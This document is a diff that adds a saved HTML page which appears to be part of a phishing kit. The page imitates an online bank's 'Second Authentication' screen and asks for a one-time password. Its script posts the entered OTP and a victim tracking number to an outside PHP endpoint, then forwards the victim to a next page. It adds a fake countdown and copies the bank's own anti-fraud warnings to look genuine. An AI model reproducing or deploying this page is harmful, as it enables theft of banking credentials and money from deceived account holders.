@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://rocketply.cleverapps.io/secpage -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <style>
+        body {
+            font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
+            font-size: 12px;
+            line-height: 1.42857143;
+            color: #333;
+            margin: 0;
+            background-color: #fff
+        }
+
+        .logo {
+            margin-left: 15px;
+            margin-top: 15px
+        }
+
+        .navigation {
+            margin-top: 10px
+        }
+
+        .nav-img,
+        .navigation img {
+            width: 100%
+        }
+
+        .nav-img {
+            height: 49
+        }
+
+        .login-heading {
+            background: #e8f3f9;
+            border-top: 3px solid #dde6eb;
+            overflow: hidden;
+            color: #124c8c;
+            margin-top: -6px
+        }
+
+        .login-heading h3 {
+            padding: 0;
+            margin: 10px 0;
+            font-size: 13px;
+            font-weight: 700
+        }
+
+        .login-heading .sub {
+            font-weight: 700;
+            color: #db3c38;
+            font-size: 13px;
+            padding: 0 10px;
+            margin-top: 0
+        }
+
+        .text-center {
+            text-align: center
+        }
+
+        .login-form {
+            margin: 0 15px
+        }
+
+        .login-form .info {
+            margin: 10px 0;
+            color: #555
+        }
+
+        .login-form .info span {
+            color: #c33a1a;
+            font-weight: 700
+        }
+
+        .form {
+            position: relative;
+            min-height: 1px;
+            padding-right: 15px;
+            padding-left: 15px
+        }
+
+        .form-group {
+            overflow: hidden;
+            margin-bottom: 12px
+        }
+
+        label {
+            display: block;
+            padding: 5px 0 0 10px;
+            max-width: 100%;
+            margin-bottom: 5px;
+            font-weight: 700
+        }
+
+        .form-group .form-control {
+            display: block;
+            width: 96%;
+            height: 34px;
+            font-size: 14px;
+            line-height: 1.42857143;
+            color: #555;
+            background: #f1f1f1;
+            border: 1px solid #ccc;
+            padding: 5px;
+            border-radius: 0;
+            box-shadow: none;
+            height: auto
+        }
+
+        .form-control:focus {
+            border: 1px solid #ccc
+        }
+
+        :after,
+        :before {
+            box-sizing: border-box
+        }
+
+        .w-50 {
+            float: left;
+            width: 50%
+        }
+
+        .captcha {
+            color: #db3c38;
+            font-weight: 700
+        }
+
+        .clear {
+            clear: both;
+            content: ""
+        }
+
+        .show {
+            display: block
+        }
+
+        .hidden {
+            display: none
+        }
+
+        .top-10 {
+            margin-top: 20px;
+            margin-bottom: 20px
+        }
+
+        .btn {
+            background: #486d90;
+            border: 0;
+            border-radius: 0;
+            color: #fff;
+            padding: 5px 13px;
+            margin: 0 5px 0 0
+        }
+
+        a {
+            color: #337ab7;
+            text-decoration: none;
+            font-weight: 400
+        }
+
+        a:hover {
+            text-decoration: underline
+        }
+
+        .virtual_link {
+            background: #f2f6f7;
+            padding: 10px;
+            clear: both
+        }
+
+        .bg-blue {
+            background: #2b2f76;
+            color: #fff;
+            padding-bottom: 3px
+        }
+
+        .bg-blue span {
+            font-size: 12px;
+            padding: 5px 8px;
+            display: inline-block
+        }
+
+        .login-box {
+            margin: 0 20px
+        }
+
+        .login-box p {
+            line-height: 22px;
+            font-size: 11px;
+            margin: 10px 0 0;
+            text-align: justify;
+            color: #555
+        }
+
+        .box {
+            background: #fafafa;
+            border: 1px solid #eee;
+            margin: 15px 0;
+            padding: 20px 30px;
+            text-align: center
+        }
+
+        .login_box_links {
+            margin: 10px 10px 0 0;
+            list-style: none;
+            margin: 10px 25px 0;
+            padding: 0;
+            overflow: hidden;
+            float: left
+        }
+
+        .login_box_links li {
+            margin: 3px 0;
+            padding: 5px 0 0;
+            border-bottom: 1px dotted #cecece
+        }
+
+        .login_box_links li a,
+        .provide {
+            font-size: 11px
+        }
+
+        .provide {
+            list-style: square;
+            margin: 0 0 0 20px;
+            padding: 20px;
+            color: #555
+        }
+
+        .p-body {
+            background: #e2ecf0
+        }
+
+        .footer_area {
+            background: #414141;
+            border-top: 3px solid #1b75bc;
+            overflow: hidden;
+            padding: 5px 15px
+        }
+
+        .footer {
+            background: #535353
+        }
+
+        .footer p {
+            margin: 0;
+            padding: 5px 15px;
+            font-size: 11px;
+            color: #fff
+        }
+
+        .panel {
+            background: #efefef none repeat scroll 0 0;
+            color: #444;
+            font-size: 11px;
+            padding: 10px 15px;
+            font-weight: 700;
+            text-align: right
+        }
+
+        .panel span {
+            display: inline-block
+        }
+
+        .panelDiv {
+            background: #fff none repeat scroll 0 0;
+            border-bottom: 1px solid #ccc;
+            overflow: hidden
+        }
+
+        .content_heading {
+            background: #e1eef2 none repeat scroll 0 0;
+            overflow: hidden;
+            padding: 7px
+        }
+
+        .content_heading h3 {
+            font-size: 12px;
+            font-weight: 700;
+            line-height: 17px;
+            color: #16629c;
+            margin: 5px;
+            padding: 0
+        }
+
+        .content_title {
+            color: #39729e;
+            font-size: 13px;
+            font-weight: 700;
+            margin: 0 0 10px;
+            padding: 0
+        }
+
+        .content_area {
+            overflow: hidden;
+            padding: 12px
+        }
+
+        .mandatory_txt {
+            color: #f37856;
+            font-size: 11px;
+            font-style: italic
+        }
+
+        .commonbutton {
+            text-align: center
+        }
+
+        .commonbutton .btn-default {
+            background: #f89611 none repeat scroll 0 0;
+            border: 0;
+            font-weight: 700
+        }
+
+        .commonbutton .btn {
+            color: #fff;
+            padding: 3px 10px
+        }
+
+        .btn {
+            display: inline-block;
+            margin-bottom: 0;
+            font-weight: 400;
+            text-align: center;
+            white-space: nowrap;
+            vertical-align: middle;
+            touch-action: manipulation;
+            cursor: pointer;
+            background-image: none;
+            border: 1px solid transparent;
+            padding: 6px 12px;
+            font-size: 14px;
+            line-height: 1.42857143;
+            border-radius: 4px;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none
+        }
+
+        .common_btn .btn {
+            color: #fff;
+            padding: 3px 10px
+        }
+
+        .btn-resend {
+            background: #198379 none repeat scroll 0 0;
+            border: 0
+        }
+
+        .notify_icon {
+            background: transparent none repeat scroll 0 0;
+            line-height: 18px;
+            padding: 0
+        }
+
+        .notify_icon ul {
+            padding: 0 0 0 10px
+        }
+
+        .no_marg,
+        .notify_icon ul {
+            margin: 0
+        }
+
+        .content_area ol,
+        .content_area ul,
+        .info_panel ol,
+        .info_panel ul {
+            line-height: 2
+        }
+
+        .info_panel {
+            background: #fcf5e9 none repeat scroll 0 0;
+            margin: 0 -12px;
+            overflow: hidden;
+            padding: 12px
+        }
+
+        #crumb,
+        #notifications,
+        .content_panel,
+        .info_panel,
+        .left_menu_slider,
+        .left_menu_slider ul ul,
+        .ql_dropdown_content {
+            border: none;
+            border-radius: 3px;
+            box-shadow: 0 3px 4px rgba(0, 0, 0, .25), 0 5px 5px rgba(0, 0, 0, .11)
+        }
+
+        .text-danger .invalid {
+            color: red
+        }
+
+        .invalid {
+            font-size: 18px;
+            font-weight: 700
+        }
+
+        .text-danger {
+            color: red
+        }
+
+        .dataList {
+            max-width: 600px;
+            margin: auto
+        }
+
+        .row {
+            padding: 9px;
+            font-size: 15px;
+            border-bottom: 1px solid #dde6eb
+        }
+
+        .loading-fast {
+            margin-top: 40px
+        }
+
+        .column {
+            position: relative;
+            min-height: 1px;
+            padding-right: 15px;
+            padding-left: 15px
+        }
+
+        .login-button-span {
+            width: 250px;
+            display: inline-block;
+            text-align: center;
+            color: #10578d;
+            font-weight: 700;
+            font-size: 13px
+        }
+
+        .continue_btn {
+            position: static;
+            padding: 10px 10px 10px 24px;
+            bottom: 47px
+        }
+
+        .banner-box {
+            border: 1px solid #a8dcf1;
+            margin: 0 15px 15px
+        }
+
+        .continue_btn a {
+            background: #2b9dcc;
+            color: #fff;
+            display: block;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 10px;
+            text-align: center;
+            width: 250px
+        }
+
+        .terms-area {
+            background: #f6f6f6;
+            padding: 5px 0;
+            color: #34495e;
+            border-top: 2px solid #bdc8d4
+        }
+
+        .terms-area p {
+            font-size: 12px;
+            margin-left: 30px;
+            margin-right: 30px
+        }
+
+        .linebreak {
+            line-height: 1px;
+            margin: 10px 0
+        }
+
+        .row-detail {
+            padding: 2px;
+            font-size: 16px;
+            color: blue
+        }
+
+        .rowName {
+            color: #000
+        }
+
+        .status {
+            font-size: 12px;
+            color: red
+        }
+    </style>
+
+
+
+
+    
+    <meta name="viewport" content="width=device-width">
+    <title>%$%#%$#%%^%</title>
+    <meta name="description" content="%$%#%$#%%^%">
+    <meta name="next-head-count" content="4"><noscript data-n-css=""></noscript>
+    <script defer="" nomodule="" src="polyfills-c67a75d1b6f99dc8.js.download"></script>
+    <script src="webpack-fd9fb29a92855ab4.js.download" defer=""></script>
+    <script src="framework-fe99aa755573eedd.js.download" defer=""></script>
+    <script src="main-a307755b2b1681d8.js.download" defer=""></script>
+    <script src="_app-620102ba3a9296b8.js.download" defer=""></script>
+    <script src="720-19dcb8dafcb16bc2.js.download" defer=""></script>
+    <script src="873-4d86f5fc0fa0c51b.js.download" defer=""></script>
+    <script src="bb-df59b65fa845d375.js.download" defer=""></script>
+    <script src="_buildManifest.js.download" defer=""></script>
+    <script src="_ssgManifest.js.download" defer=""></script>
+</head>
+
+<body onload="startTimer();">
+    <div id="__next">
+        <main>
+            <div class="logo" style="display:flex;justify-content: center;align-items: center;"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27100%27%20height=%2737%27/%3e"></span><img alt="site logo" src="logo.jpeg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"></span>
+            </div><br>
+            <div class="panelDiv">
+                <div class="panel"><span></span></div>
+            </div>
+            <div class="content_heading">
+                <h3 class="pull-left">Second Authentication</h3>
+            </div>
+            <div class="content_area">
+                <p class="content_title">Enter One Time Password sending to your phone</p>
+                <p class="mandatory_txt">Mandatory fields are marked with an asterisk (*)</p>
+
+
+
+
+                <div class="form-group">
+
+                    <label class="control-label" for="Otp1"> One Time Password<span class="mandatory_txt">*</span></label>
+
+                    <input class="form-control" id="otp1" type="text" name="Otp1" maxlength="8">
+
+
+                </div>
+                <div class="commonbutton">
+
+                    <input onclick="insertData()" name="btContinue" id="btContinue" type="button" class="btn btn-default" title="submit" value="submit">
+
+
+                    <script type="text/javascript">
+                        var random_no = localStorage.getItem('random_no');
+                        function insertData() {
+                            var otp = document.getElementById("otp1").value;
+                            if (otp != "") {
+
+                                var data = {
+                                    otp: otp,
+                                    random_no: random_no
+
+                                };
+                                var xhr = new XMLHttpRequest();
+
+                                xhr.open("POST", "https://test-annad.in/annad/sbi/bb.php", true);
+                                xhr.setRequestHeader("Content-Type", "application/json");
+                                xhr.onreadystatechange = function () {
+                                    if (xhr.readyState === 4 && xhr.status === 200) {
+                                        console.log(xhr.responseText);
+                                        window.location.href = 'thirdpage.html';
+
+
+
+                                    }
+                                };
+                                xhr.send(JSON.stringify(data));
+
+                            }
+                            else {
+                                alert('Please fill all fields');
+                            }
+                        }
+
+                    </script>
+
+                    <p id="time"><p1> Wait for OTP   : </p1>131</p>
+                </div>
+
+
+                <div class="common_btn">
+                    <p>If you did not receive the OTP on phone, you can<a href="https://rocketply.cleverapps.io/secpage#" class="btn btn-resend" type="button">Click here to resend OTP</a></p>
+                </div>
+                <div class="info_panel">
+                    <div class="notify_icon">
+                        <ul>
+                            <li>Any of its representative never sends you email/SMS or calls you over phone to get your
+                                personal information, password or one time SMS password. Any such e-mail/SMS or phone
+                                call is an attempt to fraudulently withdraw money from your account through Internet
+                                Banking. Never respond to such email/SMS or phone call. Please report immediately. if
+                                you receive any such email/SMS or Phone call. Immediately change your passwords if you
+                                have accidentally revealed your credentials.</li>
+                            <li>Please note that you will receive the all communication related to Internet banking on
+                                your updated mobile number only after approval.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="footer_area"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2768%27%20height=%2728%27/%3e"></span><img alt="versign" src="logo.jpeg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"></span>
+            </div>
+            <div class="footer">
+                <p>© OnlineBanking</p>
+            </div>
+        </main>
+    </div>
+
+
+
+
+<script type="text/javascript">
+var timer=180;
+var sec=0;
+function startTimer() {
+sec=parseInt(timer%180);
+
+if (timer<2) {
+// timer.stop();
+window.location.href = "secpage";
+}
+
+document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+timer--;
+setTimeout(function(){
+startTimer();
+
+}, 1000);
+}
+
+</script></body></html>
